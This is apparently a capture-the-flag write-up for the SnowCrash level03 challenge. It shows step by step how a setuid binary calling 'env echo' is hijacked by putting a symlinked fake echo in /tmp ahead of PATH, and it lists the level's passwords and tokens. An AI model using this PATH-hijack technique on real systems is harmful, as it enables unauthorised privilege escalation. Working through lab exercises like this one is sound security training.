#### 1. The password of `level03` is the token that got from `level02`.

```
kooda2puivaav1idi4f57q8iq
```
#### 2. So, try login to level03 with the password we got from level02 and try to put the command `ls`. We can see the file `level03`. 
```bash
level00@SnowCrash:~$ su level03
Password: kooda2puivaav1idi4f57q8iq
level03@SnowCrash:~$ ls
level03
```
#### 3. Try to execute the `level03`. but it says `Exploit me`. 
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```
#### 4. When we check with `cat` command, we can see the file type as below. so, we can assume that it's `binary file`. (A binary file is a computer file that is not a text file.)
```bash
level03@SnowCrash:~$ cat level03
ELF44 	($!444  TTT��(((��hhhDDP�td44Q�tdR�td��/lib/ld-linux.so.2GNUGNUOX�;�Sy8n�n��KT{K �K��3LD= T)__gmon_start__libc.so.
6_IO_stdin_usedsetresgidsetresuidsystemgeteg��geteuid__libc_start_mainGLIBC_2.0ii
...
..
.
```
#### 5. So, let's debug with `ltrace`. `ltrace` is a debugging utility on Unix-like systems that can be used to intercept and display dynamic library calls.

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                         = 2003
geteuid()                                         = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                            = 0
+++ exited (status 0) +++
```
We found the echo of "Exploit me", the same result when we execute ./level03 at the beginning.

`system("/usr/bin/env echo Exploit me"Exploit me`

It shows that `echo` command is executed from the located in `/usr/bin/env`.

If so, we can control the execution of the env command by changing the `PATH` environment variable. 

#### 6. To execute the program `getflag` located in `/bin` as if it were echo, we create a symbolic link named echo to pointing `getflag` in `/tmp` directory. By adding `/tmp` to the PATH, we ensure that our fake echo in `/tmp` is executed when `env` searches for the `echo` command. 

```bash
level03@SnowCrash:~$ ln -s /bin/getflag /tmp/echo
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token :qi0maab88jeaj46qoumi7maus
```
* `ln`: to create the links for the files

* `-s`: option to specify that this will be a symbolic link.

* /bin/getflag : Location that is stored Password

* `export PATH="/tmp:$PATH"` : Add the PATH environment variable to pointing /tmp directory. 


#### 7.  We got a token for next level04

```

```
